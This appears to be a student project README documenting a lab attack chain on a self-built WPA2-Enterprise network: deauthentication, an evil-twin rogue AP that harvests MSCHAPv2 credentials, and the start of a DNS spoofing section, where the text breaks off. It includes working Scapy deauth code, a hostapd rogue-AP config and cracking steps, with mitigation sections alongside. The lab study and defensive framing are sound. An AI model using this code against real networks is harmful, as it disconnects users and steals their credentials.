## What?

In this project, me and my colleagues had fun playing with a WPA2 Enterprise network architecture that we setup in order to apply a real life chain of attack. First **deauth attack**, then **evil twin attac**k and once inside the network, a **DNS spoofing attack**.

We took as reference the paper [METTER PAPER] which performed several different attacks on a wider network architecure, closer to an enterprise one.




## Table of Content

- [Introduction]()
- [Paper Results]()
- [Overview of the Architecture]()
- [Let's setup]()
- [Performed Attacks]()
  - [Deauthentication]()
    - [Possible Mitigations]()
  - [Evil Twin  Attack]()
    - [Possible Mitigations]()
  - [DNS Spoofing]()
    - [Possible Mitigations]()





## Introduction
This project aims to examine the paper **”Empirical Evaluation of Attacks
Against IEEE 802.11 Enterprise Networks: The AWID3 Dataset”**, which
analyzes the vulnerabilities of the IEEE 802.11 protocol, with a specific focus on
attacks conducted in environments protected by security mechanisms such as Pro-
tected Management Frames (PMF) introduced with the IEEE 802.11w.




## Paper Results

The analysis conducted in the paper yielded a series of significant findings regarding
the security of IEEE 802.11 enterprise networks.


One of the most relevant aspects emerging from the study concerns the **effectiveness of PMF** in mitigating deauthentication and disassociation attacks. In theory,
these security mechanisms should prevent attackers from sending unauthenticated
management frames to force clients to disconnect from the network. 

However, the tests revealed that, while PMF enhances protection against some attacks, its implementation varies significantly across different devices, and in some cases, it is not
sufficient to fully prevent client disconnections. One of the most relevant aspects
emerging from the study concerns the effectiveness of PMF in mitigating deauthentication and disassociation attacks. In theory, these security mechanisms should
prevent attackers from sending unauthenticated management frames to force clients
to disconnect from the network. However, the tests revealed that, while PMF enhances protection against some attacks, its implementation varies significantly across
different devices, and in some cases, it is not sufficient to fully prevent client disconnections.


**Another interesting aspect** revealed by the analysis was the variation in security implementations across different hardware and software vendors. The
tests showed that while some Windows and Linux devices formally support PMF
and WPA3, **they exhibit significant differences in how they handle attacks**. For
example, some devices ignored unprotected deauthentication frames, while others
processed them, resulting in a connection loss—even when the protocol should theoretically prevent this. This demonstrates that the protection offered by PMF does
not solely depend on the protocol itself but also on how manufacturers implement the specifications in their devices.



## Overview of The Architecture 

The list of what was needed in our environment to make it work comprises:

- Router supporting WPA2 Enterprise
- RADIUS server (**Freeradius**) on an Ubuntu Server
- Clients for testing- PCs and Phones

We run Freeradius on a VM in a Proxmox server. The server had an assigned NIC that connected it directly to the router. We also
tried deploying an AD Domain Controller on a Windows Server for storing users credentials, the connection between Freeradius and the DC worked flawlessly but the
user authentication could not work and we decided to drop this approach relying only on the Freeradius server and users specified in its configuration file. The architecture
can be seen in the figure below. 
![image](https://github.com/user-attachments/assets/c6e91a47-6382-4f62-bf95-a6988d8adae1)


## Let's setup

The Freeradius server was setup in a way that the clients connecting to the router
needed credentials and the server provided a certificate instead. This is the basis
for the **PEAP-MSCHAPv2 authentication scheme**.

After having installed the freeradius server with: '**$ sudo apt-get install freeradius**' we needed to enable the specific freeradius module for PEAP-MSCHAPv2 authentication mechanism.

The configuration file is at: **/etc/freeradius/3.0/sites-enabled/default** and we make sure the module has the lines  **AUth-Type MS-CHAP { mschap}**  uncommented. We do this both for the Authenticate{} and the Authorize{} section.



At this point some users are needed to be in the **/etc/freeradius/3.0/users**. We added a user named **Bob** with its password being **hello** with the string **"bob" Cleartext-Password := "hello"**.

Notice that we didn’t apply any hashing techniques to the password so that the cracking process would be easier. In reality, hash+salt should be the preferred way
to store the passwords.



The second to last step is to generate the RADIUS server certificate, since the server authenticate itself to the client using them. We generate the public and private certs using the default conf. The process involves compiling with the **make** command inside the **/etc/freeradius/3.0/certs** folder.

To conclude, we set PEAP-MSCHAPv2 as the RADIUS server authentication scheme at **/etc/freeradius/3.0/mods-enabled/eap** inside the peap section.

## Performed Attacks

The attacks that we implemented have been chosen in such a way that they resemble a real chain of attack in a real scenario. First happens **reconnaissance** during which we studied the networks and decided which was the best target.

The attacked network’s SSID is **TP-Link 4784**. We started with the **Deauthentication attacks**, so that the we force the connected clients to join our fake network. Then we performed an **Evil Twin Attack**, creating a fake AP in such a way that the client would be tricked into reconnecting to the network. The combination of these two types of attack ensures that the client, after being deauthenticated, can see our rogue AP as the one with the highest signal and thus wanting to connect to it.

Finally, to simulate what an attacker can do after having breached into the network, we performed a **DNS spoofing attack** manipulating the ARP tables of the router and of the client, in order to demonstrate how an attacker that gain access to the network can redirect the traffic of clients. In our case, we redirected the traffic to a simple webserver that we spwaned that comprised a HTML webpage saying ”This is a fake web page, part of our DNS spoofing attack”.

## Deauthentication

For this attack, since we wanted to deeply understand the reality of what was happening under the hood, we decided to **ditch the Kali Linux Tool aireplay-ng** and choose to implement our own Python Code using the Scapy Library.

The functions that make the attack works are:
  - scan for ap(ssid, interface)
  - scan for clients(ap mac, interface)
  - disconnect user(target mac, ap mac, interface)

```python
def scan_for_ap(ssid, interface):
    print(f"Scanning for AP with SSID: {ssid}...")
    found = []  # List to save the found MAC address

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon) and pkt.info.decode() == ssid:
            print(f"Found AP: {ssid}, MAC: {pkt.addr2}")
            found.append(pkt.addr2)
            return True

    def stop_filter(pkt):
        return len(found) > 0

    sniff(iface=interface, prn=packet_handler, timeout=10,
          store=False, stop_filter=stop_filter)

    return found[0] if found else None
```

```python
def disconnect_user(target_mac, ap_mac, interface):
    if not target_mac or not ap_mac:
        print("Error: AP or target MAC address missing!")
        return

    print(f"Sending deauth attack to {target_mac} from {ap_mac} via {interface}")
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
```

```python
def scan_for_clients(ap_mac, interface):
    print(f"Scanning for clients connected to AP {ap_mac}...")
    clients_info = {}

    def packet_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 2 and pkt.addr3 == ap_mac:
            client = None
            if pkt.FCfield & 0x01:
                client = pkt.addr2
            elif pkt.FCfield & 0x02:
                client = pkt.addr1

            if client and client != ap_mac:
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
                if client not in clients_info:
                    print(f"Detected Client: {client}, Signal: {signal}")
                    clients_info[client] = {'mac': client, 'signal': signal}

    sniff(iface=interface, prn=packet_handler, timeout=15, store=False)
    return list(clients_info.values())
```
One thing to notice is that as interface we used ”wlan0” which is the one coming out of the **ALFA AWUS036ACH adapte**r as shown in figure below.

<img src="https://github.com/user-attachments/assets/e8aa2e27-3f9f-47ff-a647-368f4a8c4bb8" width="500" height="500">

The **disconnect user()** function sends deauthentication packets to disconnect a specific device (target mac) from an Access Point (ap mac). 

First, it checks if the MAC addresses are valid; if not, it prints an error message and terminates. If the parameters are correct, the function creates and sends a deauthentication packet using the Scapy library. The packet consists of three parts: RadioTap() (PHY header for the physical layer), Dot11() (specifies source, destination, and BSSID addresses), and Dot11Deauth(reason=7) (a deauthentication frame with reason code 7). The function uses sendp() to transmit 100 packets at 0.1-second intervals on the specified interface.

The reason=7 code means that a device has sent a communication frame without being properly connected to the Access Point. Basically the router is saying to the device: ”You are not authorized to send me data because you’re no longer connected!” and disconnects it from the network. This mechanism ensures that
only authenticated devices can communicate with the AP. To show that the packet effectively deauthenticated the client from the AP we encoded in our script a way to save the captured traffic as a pcap file, so that we could study it via wireshark.

In thefigure below we can see the deauthentication packet in **wireshark**.
![image](https://github.com/user-attachments/assets/b8d3c078-113c-4b43-94ad-85667501e63d)

Since we wanted to try also the **Disassociation attack**, we wrote a script that is almost the same as the deauth one but the difference lies in the packet that the Disassociation function builds, adding a Dot11Disass frame.

## Possible Mitigations

When using a **WPA2-Enterprise** network, mitigating deauthentication attacks requires a combination of security measures that strengthen the network against unauthorized disconnection attempts. One of the most effective defenses is enabling **802.11w**, also known as Protected Management Frames **(PMF)**.

PMF encrypts critical management frames, including deauthentication and disassociation messages, making it nearly impossible for an attacker to forge them. Without PMF, an attacker can easily send fake deauthentication packets to disrupt connections, forcing devices to disconnect and reconnect repeatedly. By enabling PMF, especially in **”Required”** mode rather than **”Optional”**, you ensure that all devices must support it, preventing attackers from exploiting unprotected clients. Enabling this feature significantly reduces the effectiveness of deauthentication attacks in enterprise environments.

Another essential layer of protection is implementing a Wireless Intrusion Detection and Prevention System **(WIDS/WIPS)**. This system continuously monitors the wireless environment for suspicious activity, such as an unusually high number of deauthentication frames. When a potential attack is detected,
WIPS can automatically take action, such as blocking the attacking device, alerting administrators, or dynamically adjusting security settings to mitigate the impact.

This proactive monitoring ensures that unauthorized deauthentication attempts are detected and neutralized before they cause significant disruptions.
Reducing signal strength is another important, yet often overlooked, technique to limit exposure to potential attackers. 

If the Wi-Fi signal extends too far beyond the intended coverage area—such as reaching outside office walls or into public spaces—it becomes easier for an attacker to launch deauthentication attacks from a distance without being physically present inside the building. By adjusting the transmission power of the access points to only cover the necessary areas, it is harder for attackers to interfere with the network while still providing full coverage to legitimate users.


## Evil Twin Attack

After having disconnected the client from the real AP, we conduct the Evil Twin Attack. It consists in spwaning a fake AP and waiting for the client to connect to it.
We could have used the Kali Linux Tool Airgeddon that comprises all the things needed to perform the attack, but wanted to approach the matter at a lower level, so we ended up building the attack in the following way.

To fake the AP we used **hostapd** with the configuration as shown here, in which we specify to use the freeradius-wpe server that we setup on kali (eap server = 0) and the ip would be the localhost (radius server auth=127.0.0.1)

```bash
interface=wlan0
driver=nl80211
ssid=TP-Link_Fake
hw_mode=g
channel=2
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=0
eapol_version=2
radius_server_auth=127.0.0.1
radius_server_auth_port=1812
radius_server_secret=testing123
```

As we can see from the figures below the AP TP-Link Fake was created successfully.

<img src="https://github.com/user-attachments/assets/69aaac8e-4ca0-4ee1-b8b0-4da7d17859d3" width="360" height="800">
<img src="https://github.com/user-attachments/assets/6bd7084f-6e3b-474d-b7e6-f676490754cf" width="360" height="800">




Since the network that we want to attack is a WPA2 Enterprise one, we needed to setup a **fake freeradius server** to connect to the fake AP. 
We installed the **freeradius-wpe (wireless pownage edition)** from the Kali Linux repo. (https://www.kali.org/tools/freeradius-wpe/).

From running freeradius-wpe in debug mode

```bash
$ freeradius-wpe -X
```

we had the view of what was happening during the connection of clients and the authentication phase. After havig connected the client infact, in the shell where we run freeradius-wpe we could see the challenge sent from our Kali Box to the client and the response of the client that comprised the credential of that user. As shown below

![image](https://github.com/user-attachments/assets/da22216c-64c0-4489-945f-8324cc2f8e21)


Now, after having captured the challenge-response, it is time to crack it using **Jhon The Ripper** ( tool already present in Kali Linux). Since we already knew the password was ”hello” we used the RockYou.txt file to crack it. 

![image](https://github.com/user-attachments/assets/7f2691ce-789c-44b9-afef-51dfbe5ea392)

Notice that the **challenge-capture.txt** file format was **”bob::NETNTLM$challenge $response”**

## Possible Mitigations
To mitigate the risk, several secure authentication mechanisms can be employed, including EAP-TTLS with PAP and EAP-GTC.

**EAP-TTLS** (Extensible Authentication Protocol - Tunneled Transport Layer Security) with PAP (Password Authentication Protocol) is a strong mitigation strategy. PAP transmits passwords in plaintext within a secure TLS tunnel. The overall security relies on the robustness of TLS, which uses AES-256 encryption and RSA/ECDSA certificates to ensure confidentiality.

**EAP-GTC** transmits passwords within an encrypted TLS tunnel. It offers greater security than MSCHAPv2 by avoiding challenge-response mechanisms, which can be susceptible to offline cracking attacks.
While well-supported in Linux environments, compatibility issues arise with Windows and Android.

As reported in the Book: **”The Ultimate Kali Linux Book: Perform Advanced Penetration”** organizations should follow these guidelines to minimize
the risks associated with wireless network attacks:
  
  - Deploy a Wireless Intrusion Prevention System (WIPS) on all corporate wireless
  networks.
  
  - Regularly update firmware and install patches on all wired and wireless devices.
    
  - Ensure compliance with the National Institute of Standards and Technology
  **(NIST) SP 800-97** framework for robust wireless security. NIST SP 800-97.
  
  - Whenever feasible, implement multi-factor authentication (MFA) for network ac-
  cess.
  
  - Utilize certificate-based authentication to enhance the confidentiality and integrity
  of wireless communications.
  
  - Implement Authentication, Authorization, and Accounting (AAA) protocols such
  as RADIUS to manage user access and security effectively.
  
  - Establish segmented and isolated guest wireless networks to limit access and exposure.

## DNS Spoofing

For this final attack, now that the attacker has the credentials of the network, we
performed a DNS Spoof, in which a DNS request gets replied with a fake website
domain.
To makes things easy, we run a webserver with python ”python3 -m http.server
80” that showed a simple index.html file showing ”Welcome to the Fake Page,
this page is for DNS spoofing”. We run this on a different pc connected to the
